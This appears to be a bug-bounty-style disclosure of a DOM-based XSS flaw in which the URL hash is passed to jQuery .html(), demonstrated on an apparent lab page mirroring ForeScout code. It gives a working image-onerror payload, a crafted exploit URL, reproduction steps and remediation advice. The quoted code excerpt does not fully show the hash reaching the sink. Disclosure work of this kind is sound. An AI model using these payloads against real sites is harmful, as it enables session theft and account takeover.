# DOM-Based Cross-Site Scripting (XSS) - ForeScout Technologies

## Summary

I identified a DOM-Based Cross-Site Scripting (XSS) vulnerability in the ForeScout Technologies application.

The application reads the URL fragment (hash) using `window.location.hash` and inserts it directly into the HTML using jQuery methods without any sanitization or output encoding. Since browsers never encode angle brackets (`<>`) in URL fragments, an attacker can inject arbitrary HTML and JavaScript directly through the URL hash.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering a `confirm(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - DOM-Based (Hash Fragment Injection)**

## Vulnerable Parameter

```text
URL Fragment (Hash)
```

## Vulnerable URL

```text
https://kzlabs.in/68.php#<img SRc=x ONeRror=confirm(1)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value of the URL fragment (hash) with the following payload:

   ```text
   #<img SRc=x ONeRror=confirm(1)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/68.php#%3Cimg%20SRc%3Dx%20ONeRror%3Dconfirm%281%29%3E
   ```

4. Observe that the browser executes the injected payload and displays a `confirm(1)` popup.

## Payload Used

```text
#<img SRc=x ONeRror=confirm(1)>
```

URL-encoded version:
```text
#%3Cimg%20SRc%3Dx%20ONeRror%3Dconfirm%281%29%3E
```

Alternative payload:
```text
#'>anil
```

## Proof of Concept

The vulnerability is DOM-Based, meaning the malicious payload is processed entirely on the client-side via the URL fragment.

The vulnerable JavaScript code:
```javascript
// Vulnerable hash-based auto-trigger (mirrors original ForeScout code)
$(window).on('load', function() {
    var hash = window.location.hash; // source - no sanitization
    // ... hash is used without sanitization
});
```

The payload works by:
1. The application reads the URL fragment using `window.location.hash`
2. The hash value is inserted directly into the HTML using jQuery methods without sanitization
3. Browsers never encode angle brackets (`<>`) in URL fragments, allowing raw HTML injection
4. The injected `<img>` tag with mixed-case `ONeRror` event handler executes when the image fails to load
5. The `confirm(1)` function executes, displaying a popup

```html
<!-- Injected payload rendered in the page: -->
<img src="x" onerror="confirm(1)">
```

The source code confirms the vulnerability:
```javascript
$('#f-body').html('<p>'+$content.html()+'</p>');
```

The application appears to be using jQuery methods like `.html()` which are vulnerable to XSS when user-controlled content is passed without sanitization.

<img width="1625" height="1010" alt="Screenshot 2026-08-14 211054" src="https://github.com/user-attachments/assets/b05b5974-86a0-4b97-988b-eaced08838cc" />

<img width="1495" height="604" alt="Screenshot 2026-08-14 211201" src="https://github.com/user-attachments/assets/25435f01-5f6b-4db0-b668-f0c7e9803a23" />

## Impact

DOM-Based XSS vulnerabilities via URL hash fragments are particularly dangerous because:

- **Client-Side Execution**: Payloads execute in the victim's browser context
- **No Server-Side Filtering**: Server-side filters don't process URL fragments
- **Bypasses WAF**: Web Application Firewalls typically don't inspect URL fragments
- **Easy to Distribute**: Attackers can craft malicious links and distribute them via email or social media
- **Hidden from Logs**: URL fragments are not typically logged by servers

An attacker can:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Avoid HTML Insertion**: Never use `.html()` or `innerHTML` to insert user-controlled content. Use `.text()` instead.
  ```javascript
  // Unsafe
  $('#f-body').html('<p>' + userContent + '</p>');
  
  // Safe
  $('#f-body').text(userContent);
  ```

- **Sanitize Input**: If HTML rendering is required, use a sanitization library like DOMPurify.
  ```javascript
  $('#f-body').html(DOMPurify.sanitize(userContent));
  ```

- **Input Validation**: Validate and sanitize all user inputs, including URL fragments.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and unauthorized script sources.

- **Use Safe DOM APIs**: Use `createElement()` and `setAttribute()` instead of HTML string concatenation.

- **URL Fragment Encoding**: Consider URL-encoding the fragment before inserting it into the DOM.

- **Web Application Firewall (WAF)**: Configure WAF rules to inspect and block malicious URL fragments.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

---
